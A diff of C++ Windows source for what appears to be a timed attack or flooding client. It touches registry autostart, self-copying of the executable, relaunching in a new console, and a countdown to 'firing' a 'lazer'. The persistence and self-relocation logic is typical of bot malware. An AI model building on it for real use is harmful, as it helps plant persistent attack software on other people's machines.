@@ -43,27 +43,6 @@ void AddProgramToAutoStart(bool Allusers)
     RegCloseKey(newValue);
 }
 
-std::wstring CopyToLocation(std::wstring _location)
-{
-    std::wstring path;
-    path.append(GetPath().c_str());
-    path.append(GetExeName().c_str());
-
-    _location.append(GetExeName().c_str());
-
-    if(path == _location)
-        return L"TRUE";
-
-    if(CopyFileW(path.c_str(), LPCWSTR(_location.c_str()), FALSE) == 0)
-        printf("COPYING FILE STATUS: FAILED! ERROR CODE: %u \n", GetLastError());
-    else
-    {
-        printf("Copying Exe To New Location FINISHED. NEW LOCATION: %s\n", _location.c_str());
-        return _location;
-    }
-    return L"FALSE";
-}
-
 int _tmain(int argc, TCHAR* argv[])
 {
     //I can't Force Unicode in any other way
@@ -91,12 +70,12 @@ int _tmain(int argc, TCHAR* argv[])
         {
             std::wstring AppLocation = CopyToLocation(argv[i+1]);
 
-            if(wcscmp(AppLocation.c_str(), L"TRUE") == 0) // nice wayout is nice! :D
+            if(wcscmp(AppLocation.c_str(), GetFullPath().c_str()) != 0)
             {
                 PROCESS_INFORMATION pi = {0};
-                LPSTARTUPINFOW         si = {0};
+                STARTUPINFOW         si = {0};
 
-                si->cb = sizeof(LPSTARTUPINFOW);
+                si.cb = sizeof(STARTUPINFOW);
 
                 std::wstring arguments = L"";
                 for(int j = 1; j < argc; j++)
@@ -108,10 +87,10 @@ int _tmain(int argc, TCHAR* argv[])
                     arguments.push_back(' ');
                 }
 
-                CreateProcess(AppLocation.c_str(), LPWSTR(arguments.c_str()), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, si, &pi);
+                CreateProcess(AppLocation.c_str(), LPWSTR(arguments.c_str()), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi); 
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
-                return 0;
+                exit(1);
             }
         }
 
@@ -137,7 +116,7 @@ int _tmain(int argc, TCHAR* argv[])
         int _STTP = int(floor(difftime(_TTP, time(NULL))));
         
         //Let's Print It Only In One Line
-        printf("I'M A' FIRIN' MAH LAZER IN: %i SECONDS %c", _STTP, char(13));
+        printf("%cI'M A' FIRIN' MAH LAZER IN: %i SECONDS", char(13), _STTP);
 
         if(_STTP <= 0)
         {
